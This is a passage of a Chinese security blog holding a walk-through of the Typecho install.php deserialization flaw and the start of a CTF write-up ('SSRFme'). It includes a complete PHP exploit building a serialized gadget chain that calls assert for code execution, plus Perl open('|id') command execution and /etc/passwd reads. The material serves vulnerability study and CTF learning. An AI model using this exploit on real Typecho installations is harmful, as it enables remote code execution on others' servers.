        <a data-url="http://yoursite.com/2019/07/16/%E4%B8%80%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84LFI%E5%A7%BF%E5%8A%BF/" data-id="ckabsu3910037kkvrd5dt1b8z" class="article-share-link" data-share="baidu" data-title="一些有趣的LFI姿势">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/16/%E4%B8%80%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84LFI%E5%A7%BF%E5%8A%BF/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Typecho反序列化漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-07-14T06:37:27.000Z" itemprop="datePublished">2019-07-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Typecho反序列化漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在学反序列化的时候就听过<code>typecho</code>这个比较巧妙的反序列化漏洞，故此来进行一次分析学习。</p>
<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>反序列化漏洞的出现点在<code>install.php</code>，不过到触发反序列化点之前还有一个点需要绕过的地方，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</span><br><span class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有两个判断第一个只有传入<code>finish=xxx</code>就可以绕过，第二个由于是本地实验，不存在跨站请求的问题。接下来进入漏洞入口点<code>install.php 232行到237行</code>，代码如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5JMmd.png" alt="Z5JMmd.png"></p>
<p>可以看到我们所需要的关键字<code>unserialize</code>了，跟进<code>Typecho_Cookie::get</code>方法(全局搜索)，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键语句为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br></pre></td></tr></table></figure>

<p>当代码中传入<code>__typecho_config</code>时，会对<code>$cookie[__typecho_config]</code>进行检测，如果没有的话，由<code>$_POST[&#39;__typecho_config&#39;]</code>决定，所以我们可以通过<code>post</code>来控制<strong>反序列化的值</strong>。接着向下看，有一个<code>new Typecho</code>的操作,跟进这个类，并且查看<code>__construct</code>魔术方法，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现危险操作<code>$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>，进行了一个字符串拼接,如果单看这个简单的字符串拼接确实是没有危险的，但是<code>$adaptername</code>是由我们控制的，如果我们将<code>$adaptername</code>设为一个类，那么就会触发该类的<code>__toString</code>魔术方法，全局搜索一下<code>__toString</code>。</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5Y2PP.png" alt="Z5Y2PP.png"></p>
<p>共发现三处<code>__toString</code>魔术方法，不过<code>Config.php</code>和<code>Query.php</code>中的<code>__toString</code>方法并没有什么作用，主要来看一下<code>Feed.php</code>中的<code>__toString</code>。(由于比较长，只截取有问题的部分代码)</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5tlJP.png" alt="Z5tlJP.png"></p>
<p>可以看到<code>Typecho_Feed</code>类中的<code>__toString</code>方法中也是存在危险操作的，我们同样是可以控制<code>$item[&#39;author&#39;]</code>的，如果我们将这个设置为一个类，这个类去访问不存在的<code>screenName</code>就会触发<code>__get</code>魔术方法，全局搜索一下<code>__get</code>。</p>
<p><a href="https://imgchr.com/i/Z5NSl8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/14/Z5NSl8.png" alt="Z5NSl8.png"></a></p>
<p>跟进<code>Request.php</code>中的<code>__get</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>get</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>_applyFilter</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了我们想要的<code>call_user_func</code>函数了，再回去看一下$value是怎么控制的，我们可以给<code>_params[&#39;screenName&#39;]</code>赋值为<code>phpinfo()</code>,再将<code>$_filter</code>数组添加命令执行函数，就可以打出我们想要的内容了。不过构造完<code>exp</code>打过去确实<code>500</code>，这里是因为<code>install.php</code>调用了<code>ob_start</code>函数，看一下官方手册对此函数的介绍.</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5UW26.png" alt="Z5UW26.png"></p>
<p><strong>因为我们上面对象注入的代码触发了原本的exception，导致<code>ob_end_clean()</code>执行，原本的输出会在缓冲区被清理。</strong></p>
<p>看一下<code>excepetion</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exceptionHandle</span><span class="params">($exception)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (defined(<span class="string">'__TYPECHO_DEBUG__'</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;&lt;code&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span> . htmlspecialchars($exception-&gt;getMessage()) . <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> htmlspecialchars($exception-&gt;__toString());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/code&gt;&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">404</span> == $exception-&gt;getCode() &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">self</span>::$exceptionHandle)) &#123;</span><br><span class="line">                $handleClass = <span class="keyword">self</span>::$exceptionHandle;</span><br><span class="line">                <span class="keyword">new</span> $handleClass($exception);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>::error($exception);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在触发后，会在<code>else</code>调用<code>ob_end_clean</code>来清空我们的输出，解决这个问题有两个方法(采自pupil师傅)</p>
<ol>
<li>因为 <code>call_user_func</code>函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。</li>
<li>第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。</li>
</ol>
<p>通过<code>&#39;category&#39; =&gt; array(new Typecho_Request()),</code>，将数组里封装入一个对象。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'category'</span>]) &amp;&amp; is_array($item[<span class="string">'category'</span>])) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($item[<span class="string">'category'</span>] <span class="keyword">as</span> $category) &#123;</span><br><span class="line">        $content. = <span class="string">'&lt;category&gt;&lt;![CDATA['</span>.$category[<span class="string">'name'</span>].<span class="string">']]&gt;&lt;/category&gt;'</span>.<span class="keyword">self</span>: :EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就会达到报错的效果，使得<code>ob_end_clean</code>无法正常执行，这样就能将我们的内容输出了，最终<code>exp</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'phpinfo()'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">	<span class="keyword">private</span> $_type;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_type=<span class="keyword">$this</span>::RSS2;</span><br><span class="line"> 	    <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">&#125;&#125;</span><br><span class="line">$lihuaiqiu=<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed,</span><br><span class="line">	<span class="string">'prefix'</span>=&gt;<span class="string">'lihuaiqiu'</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($lihuaiqiu));</span><br></pre></td></tr></table></figure>

<p>(ps:这里一定要注意<code>RSS</code>的设置，否则还会<code>500</code>)</p>
<p>最终运行结果</p>
<p><a href="https://imgchr.com/i/Z5afFs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/14/Z5afFs.png" alt="Z5afFs.png"></a></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>反序列化一定要注意找到由合适可以利用的作用域，以及<code>__destruct,__call,__get,__toString</code>这几个魔术方法。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ckabsu38s002hkkvrggsf0ox7" class="article-share-link" data-share="baidu" data-title="Typecho反序列化漏洞分析">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-BUUCTF-Writeup-һ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/13/BUUCTF-Writeup-%D2%BB/" class="article-date">
  <time datetime="2019-07-13T06:09:58.000Z" itemprop="datePublished">2019-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/13/BUUCTF-Writeup-%D2%BB/">BUUCTF-Writeup(一)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不错的平台，记录一些Writeup，也可以给其他人一个参考。</p>
<h3 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h3><p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">   $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">   $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">   $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">   @mkdir($dir);</span><br><span class="line">   @chdir($dir);</span><br><span class="line">   @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>原题为<code>HITCON 2017</code>，这段代码大概意思为，首先通过XFF判断用户ip,建立沙盒，并且通过<code>GET</code>传入<code>url</code>和<code>filename</code>两个参数，通过filename建立新的目录以及文件名，通过url进行<code>shell_exec</code>的GET命令执行，最终把执行的结果放在新生成的目录下的文件名中。</p>
<h4 id="首先来研究一下pathinfo函数以及basename函数的机制"><a href="#首先来研究一下pathinfo函数以及basename函数的机制" class="headerlink" title="首先来研究一下pathinfo函数以及basename函数的机制"></a>首先来研究一下pathinfo函数以及basename函数的机制</h4><p><img src="https://s2.ax1x.com/2019/07/11/Z2sbAs.png" alt="Z2sbAs.png"></p>
<p><code>basename()</code> 函数返回路径中的文件名部分,对于如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$path = <span class="string">"/testweb/home.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename($path);   <span class="comment">//home.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示不带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename($path,<span class="string">".php"</span>);  <span class="comment">//home</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码对于想要建立的目录都会进行两边<code>basename</code>，对于如下代码做下实验：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $dir;	</span><br><span class="line">    <span class="keyword">echo</span> $info[<span class="string">"dirname"</span>]; <span class="comment">//$c</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"/n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> basename($info[<span class="string">'basename'</span>]);</span><br></pre></td></tr></table></figure>

<p>如果<code>filename</code>为/a或者a这样的形式，<code>basename($info[&#39;basename&#39;]);</code>肯定是为a的，此时的目录为当前目录，再次用<code>basename</code>返回路径中的文件名肯定为空。<strong>如果为<code>a/xxx/</code>，<code>$c和$dir</code>返回的都是a，解释一下原因：第一次返回的<code>basename</code>为<code>a</code>其实相当于<code>./a</code>，那么第二次再用<code>basename</code>返回的文件名肯定也是<code>a</code>。</strong>那么比较透彻的理解了这个函数，下面的也更好做一写了。</p>
<h4 id="escapeshellarg与escapeshellcmd函数"><a href="#escapeshellarg与escapeshellcmd函数" class="headerlink" title="escapeshellarg与escapeshellcmd函数"></a>escapeshellarg与escapeshellcmd函数</h4><p><strong>escapeshellarg</strong></p>
<p>1.确保用户只传递一个参数给命令<br>2.用户不能指定更多的参数一个<br>3.用户不能执行不同的命令</p>
<p>其实我的理解就是把传入的字符串加单引号，如果我传入的是<code>ls</code>，那么经过函数操作后就变成了<code>&#39;ls&#39;</code>。同时会对传入的单引号进行一些安全处理，例如传入<code>l&#39;s</code>，那么经过处理就会变成</p>
<p><code>&#39;l&#39;\&#39;&#39;s&#39;</code>。但是结合了<code>escapeshellcmd</code>就会造成一些危险的问题。函数简单介绍如下：</p>
<p>1.确保用户只执行一个命令<br>2.用户可以指定不限数量的参数<br>3.用户不能执行不同的命令</p>
<p>其作用也就是将一些危险符号进行转义，如</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;，|，；，\ `</span><br></pre></td></tr></table></figure>

<p>下面会有详解。</p>
<h4 id="GET命令漏洞"><a href="#GET命令漏洞" class="headerlink" title="GET命令漏洞"></a>GET命令漏洞</h4><p>根本原因还是在于<code>perl</code>的<code>GET</code>函数底层实际上调用的是<code>open</code>处理，而在<code>perl</code>中，open是可以执行系统命令的。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># cat 1.pl</span></span><br><span class="line"><span class="keyword">open</span>(FD,<span class="string">"|id"</span>);</span><br><span class="line"><span class="keyword">print</span> &lt;FD&gt;;</span><br><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># perl 1.pl</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>

<p>从这段命令我们可看出来perl中open的作用。同时open是支持file协议的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">The library supports GET and HEAD methods for file requests.  The</span><br><span class="line">&quot;If-Modified-Since&quot; header is supported.  All other headers are</span><br><span class="line">ignored.  The I&lt;host&gt; component of the file URL must be empty or set</span><br><span class="line">to &quot;localhost&quot;.  Any other I&lt;host&gt; value will be treated as an error.</span><br><span class="line">Directories are always converted to an HTML document.  For normal</span><br><span class="line">files, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response are</span><br><span class="line">guessed based on the file suffix.</span><br><span class="line">Example:</span><br><span class="line">  $req &#x3D; HTTP::Request-&gt;new(GET &#x3D;&gt; &#39;file:&#x2F;etc&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure>

<p>尝试一下file协议读取 <code>GET &#39;file:/etc/passwd&#39;</code>或者<code>GET &#39;/etc/passwd&#39;</code>，都可以成功读取出文件内容。下面来尝试下执行系统命令。</p>
